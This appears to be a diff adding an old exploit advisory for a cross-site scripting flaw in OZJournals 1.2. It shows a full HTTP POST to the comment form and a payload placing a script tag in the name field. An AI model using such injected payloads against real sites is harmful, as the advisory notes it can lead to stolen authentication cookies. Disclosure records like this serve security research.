@@ -1,0 +1,43 @@
+source: http://www.securityfocus.com/bid/17954/info
+
+OZJournals is prone to a cross-site scripting vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input. 
+
+An attacker may leverage this issue to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.
+
+OZJournals 1.2 is reported to be vulnerable. Other versions may be affected as well.
+
+# OZJournals 1.2 <= Cross Site Scripting Vulnerability 
+#
+# Risk: Less critical
+# Class: Remote
+# Script: OZJournals 1.2
+# Version: 1.2
+
+----------------------------------------------------------------------------------------------
+Post Request:
+
+http://www.example.com/ozjournals/ozjournals/index.php?show=comments&action=post
+POST /ozjournals/ozjournals/index.php?show=comments&action=post HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Language: it-it,it;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Connection: keep-alive
+Referer: http://www.example.com/ozjournals/ozjournals/index.php?show=comments&action=add
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 122
+vname=test&vemail=mail%40mail.it&vlocation=test&vcomment=test
+
+ou can insert in the name an XSS code or you can modify the request in this way:
+
+vname=<SCRIPT>alert("lol");</SCRIPT>&vemail=mail%40mail.it&vlocation=test&vcomment=test
+
+----------------------------------------------------------------------------------------------
+Credit
+
+Author: Kiki
+Site: http://kiki91.altervista.org
+IRC Channel: irc.azzurra.org 6667 #system
